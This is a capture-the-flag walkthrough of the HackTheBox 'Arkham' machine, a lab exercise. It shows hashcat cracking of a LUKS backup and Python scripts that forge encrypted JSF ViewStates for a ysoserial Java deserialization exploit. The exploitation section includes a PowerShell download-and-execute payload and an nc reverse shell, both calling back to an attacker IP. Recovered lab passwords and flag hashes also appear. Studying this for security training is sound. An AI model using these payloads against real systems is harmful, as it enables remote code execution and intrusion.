```json
Alias: Arkham
Date: 06-01_2025
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.10.10.130
```

# Untitled
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8080/tcp open  http          Apache Tomcat 8.5.37
|_http-title: Mask Inc.
| http-methods:
|_  Potentially risky methods: PUT DELETE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time:
|   date: 2025-01-06T13:13:39
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

```


---
# Enumeration

We can get access to two SMB Shares using a guest account.

![[Pasted image 20250106213232.png|1000]]

The `BatShare` Contains an `appserver.zip` which has an encrypted `LUKS` file. This is a portable file format used to store file systems. The information needed to crack it is in the first 2MB of the file. We can use `dd` to split it accurately.

```bash
dd if=backup.img of=backup.img.cut bs=512 count=4097
```

Next crack using hashcat.

```shell
hashcat -m 14600 backup.img.cut ../dict
```

Here `dict` contains words from `rockyou.txt` which include `bat` in them. Since it takes a very long time to crack this will narrow it down.

We get the credentials: `batmanforever`

Then open using `luksOpen` and remount:

```bash
sudo cryptsetup luksOpen backup.img ArkhamBackup
sudo mount /dev/mapper/ArkhamBackup ./ArkhamBackup
```

The `/Mask/tomcat-stuff/web.xml.bak` contains a secret key.

```xml
<context-param>
	<param-name>org.apache.myfaces.SECRET</param-name>
	<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
```

This key is used to encrypt the value of `ViewStates`. `ViewStates` are used to store the state of the components that need to be preserved. The tomcat application at 8080 is running Apache MyFaces. Which is an open source implementation of `JSF`.

The URL `http://10.10.10.130:8080/userSubscribe.faces` contains a form. This form contains a hidden `ViewState`. In `JSF` the `ViewState` contains a serialized java object, which is encrypted using `HmacSHA1`

```xml
    <context-param>
        <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
        <param-value>HmacSHA1</param-value>
     </context-param>
```


---

# Exploitation

Lets take the default `ViewState` we encounter when navigating to `userSubscribe.faces` and decrypt it using the key we found to see how it looks.

```python
#!/usr/bin/python3
import sys
from urllib import parse
from base64 import b64decode
from hashlib import sha1
from pyDes import *
import hmac

YELLOW = "\033[93m"
RED = "\033[91m"
GREEN = "\033[32m"

def decrypt(enc_payload, key):
    cipher = des(key, ECB, IV=None, pad=None, padmode=PAD_PKCS5)
    dec_payload = cipher.decrypt(enc_payload)
    return dec_payload

def validate_hmac(enc_payload, received_hmac, key):
    computed_hmac = hmac.new(key, enc_payload, sha1).digest()
    return hmac.compare_digest(computed_hmac, received_hmac)

key = b'JsF9876-'

if len(sys.argv) != 3:
    print(YELLOW + "[!] Usage: {} [Input File] [Output File]".format(sys.argv[0]))
else:
    with open(sys.argv[1], "r") as f:
        encoded_payload = f.read()
        f.close()
    
    print(YELLOW + "[+] Decoding Base64 and URL decoding the payload")
    payload = parse.unquote_plus(encoded_payload)
    payload = b64decode(payload)
    
    # Split the encrypted payload and the HMAC signature
    enc_payload = payload[:-20]  # The last 20 bytes are the HMAC-SHA1 signature
    received_hmac = payload[-20:]
    
    print(YELLOW + "[+] Validating HMAC signature")
    if not validate_hmac(enc_payload, received_hmac, key):
        print(RED + "[!] HMAC validation failed. The payload might be tampered with!")
        sys.exit(1)
    else:
        print(GREEN + "[+] HMAC validation succeeded")
    
    print(YELLOW + "[+] Decrypting the payload")
    try:
        decrypted_payload = decrypt(enc_payload, key)
        print(GREEN + "[*] Decryption successful")

        if decrypted_payload[-1] == 0xa:
              decrypted_payload = decrypted_payload[:-1]
        
        with open(sys.argv[2], "wb") as f:
            f.write(decrypted_payload)
            f.close()
        print(GREEN + f"[*] Decrypted payload saved to: {sys.argv[2]}")
    except Exception as e:
        print(RED + f"[!] Decryption failed: {e}")
```

I'll be using the above script to decrypt it and the below one to encrypt it

```python
#!/usr/bin/python3
import sys
import hmac
from urllib import parse
from base64 import b64encode
from hashlib import sha1
from pyDes import *

YELLOW = "\033[93m"
GREEN = "\033[32m"

def encrypt(payload,key):
    cipher = des(key, ECB, IV=None, pad=None, padmode=PAD_PKCS5)
    enc_payload = cipher.encrypt(payload)
    return enc_payload

def hmac_sig(enc_payload,key):
    hmac_sig = hmac.new(key, enc_payload, sha1)
    hmac_sig = hmac_sig.digest()
    return hmac_sig


key = b'JsF9876-'

if len(sys.argv) != 3 :
    print(YELLOW + "[!] Usage : {} [Payload File] [Output File]".format(sys.argv[0]))
else:
    with open(sys.argv[1], "rb") as f:
        payload = f.read()
        f.close()
    print(YELLOW + "[+] Encrypting payload")
    print(YELLOW + f"  [!] Key : {key}\n")
    enc_payload = encrypt(payload,key)
    print(YELLOW + "[+] Creating HMAC signature")
    hmac_sig = hmac_sig(enc_payload,key)
    print(YELLOW + "[+] Appending signature to the encrypted payload\n")
    payload = b64encode(enc_payload + hmac_sig)
    payload = parse.quote_plus(payload)
    print(YELLOW + "[*] Final payload : {}\n".format(payload))
    with open(sys.argv[2], "w") as f:
        f.write(payload)
        f.close()
    print(GREEN + "[*] Saved to : {}".format(sys.argv[2]))
```

And then, we can view the serialized object using [Serialization Dumper](https://github.com/NickstaDB/SerializationDumper/releases/tag/v1.14)

```
java -jar SerializationDumper-v1.14.jar -r decViewstate

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_ARRAY - 0x75
    TC_CLASSDESC - 0x72
      className
        Length - 19 - 0x00 13
        Value - [Ljava.lang.Object; - 0x5b4c6a6176612e6c616e672e4f626a6563743b
      serialVersionUID - 0x90 ce 58 9f 10 73 29 6c
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 0 - 0x00 00
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 01
    Array size - 3 - 0x00 00 00 03
    Values
      Index 0:
        (object)
          TC_STRING - 0x74
            newHandle 0x00 7e 00 02
            Length - 1 - 0x00 01
            Value - 1 - 0x31
      Index 1:
        (object)
          TC_NULL - 0x70
      Index 2:
        (object)
          TC_STRING - 0x74
            newHandle 0x00 7e 00 03
            Length - 18 - 0x00 12
            Value - /userSubscribe.jsp - 0x2f757365725375627363726962652e6a7370
```

The first two bytes, `0xac 0xed` are the magic bytes that tell us that this is a serialized java object. We can also see that this is an array of size 3, where the first element is a string with the character `1`, the next element is just NULL and the last element is a string containing `/userSubscribe.jsp`. Which is probably the endpoint that the `/userSubscribe.faces` sends data to, to process it.

Although deserialization attacks are a big topic we won't go to in detail here, The summary is that when the server receives the above object, it tries to parse it and make sense of it. Deserialization tries to take advantage of that making use of available gadgets available at the server environment.

We will be using [ysoserial](https://github.com/frohoff/ysoserial) to create a serialized object that will execute some code over deserialization and then encrypt it using the above python script.

Creating the payload

```bash
java -jar --add-opens java.base/java.util=ALL-UNNAMED ~/opt/ysoserial-all.jar CommonsCollections6 'powershell -c "iwr -Uri http://10.10.14.6:8000/rev.exe -OutFile $env:TEMP\program.exe;Start-Process -FilePath $env:TEMP\program.exe"' > payload
```

Encrypting it:

```bash
python encryptPayload.py payload encPayload
```

Send the output in the `ViewState` field and we can get a shell as `ARKHAM\Alfred @ ARKHAM `.

---

# Lateral Movement

Alfred's Downloads folder contains a file named `backup.zip`, downloading it and viewing it in something like `Evolution`, will let us view an attachment stored in a draft email.

![[Pasted image 20250110194257.png]]

| Username | Password      |
| -------- | ------------- |
| batman   | Zx^#QZX+T!123 |
Next we can use `RunasCs.exe` to get a shell as batman, finally.. I'm Batman.

```powershell
./RunasCs.exe batman 'Zx^#QZX+T!123' "C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.6 4445 -e powershell"
```

---

# Privilege Escalation

Get the flag by

```powershell
type \\localhost\C$\Users\Administrator\Desktop\root.txt
```

---

# Flags
- dbb0d3f95af0425103612478f95265ce
- e9e76e83dcebc24b21d055a9cb621a74

#CTF